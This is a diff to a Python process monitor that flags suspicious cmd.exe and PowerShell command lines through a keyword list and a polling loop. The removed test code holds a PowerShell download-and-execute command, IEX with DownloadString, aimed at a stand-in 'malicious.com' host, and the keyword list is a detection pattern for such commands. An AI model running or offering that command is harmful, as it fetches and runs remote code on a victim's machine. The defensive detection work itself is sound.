@@ -1,4 +1,5 @@
 import psutil
+import time
 import subprocess
 import tkinter as tk
 
@@ -12,7 +13,7 @@ def is_suspicious(cmdline):
         malicious_domains = [line.strip() for line in file]
 
     # Suspicious keywords and phrases
-    suspicious_keywords = ["Invoke-Expression", "Base64", "DownloadString"]
+    suspicious_keywords = ["Invoke-Expression", "Base64", "DownloadString", "/c", "dir", "Get-ChildItem"]
     for keyword in suspicious_keywords:
         if keyword.lower() in cmdline_lower:
             return True
@@ -54,28 +55,39 @@ def is_suspicious(cmdline):
     # If none of the above criteria match, consider it not suspicious
     return False
 
-def monitor_powershell():
-    for process in psutil.process_iter(attrs=['pid', 'name', 'cmdline']):
-        if 'powershell' in process.info['name'].lower():
-            cmdline = ' '.join(process.info['cmdline'])
-            if is_suspicious(cmdline):
-                # Log or take action on the suspicious command
-                print(f"Suspicious PowerShell Command Detected: {cmdline}")
+# combine list elements into single string
+def combine_list_elements(input_list, delimiter=" "):
+    combined_string = delimiter.join(input_list)
+    return combined_string
 
+# Function to check if a process name matches cmd.exe or powershell.exe
+def is_command_or_powershell(process_name):
+    return process_name.lower() in ["cmd.exe", "powershell.exe"]
 
-# Define a test case with a suspicious PowerShell command
-test_cmdline = "powershell.exe -command 'Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/malware.ps1')\"'"
-# test_cmdline = "test"
+# Store the initial list of running command and PowerShell processes
+initial_processes = set(p.info['pid'] for p in psutil.process_iter(attrs=['name', 'pid']) if is_command_or_powershell(p.info['name']))
 
-# Test the is_suspicious function with the test_cmdline
-if is_suspicious(test_cmdline):
-    print("Test: Suspicious PowerShell Command Detected")
-else:
-    print("Test: No Suspicious PowerShell Command Detected")
+while True:
+    # Get the list of currently running command and PowerShell processes
+    current_processes = set(p.info['pid'] for p in psutil.process_iter(attrs=['name', 'pid']) if is_command_or_powershell(p.info['name']))
 
-def start_monitoring_code():
-    # Use subprocess to run the anti_virus.py script
-    subprocess.Popen(["python", "anti_virus.py"])
-    
-# Example usage:
-monitor_powershell()
+    # Find new processes
+    new_processes = current_processes - initial_processes
+
+    # Log the new processes, if cmd is suspicious, output pid, location and cmd run
+    if new_processes:
+        for pid in new_processes:
+            try:
+                process = psutil.Process(pid)
+                cmd_line = combine_list_elements(process.cmdline())
+                if cmd_line and is_suspicious(cmd_line):
+                    print("New suspicious CLI processes detected:")
+                    print(f"Process ID: {pid}, Command: {' '.join(process.cmdline())}")
+            except psutil.NoSuchProcess:
+                pass
+
+    # Update the initial list of processes
+    initial_processes = current_processes
+
+    # Sleep for a while to reduce CPU usage
+    # time.sleep(1)
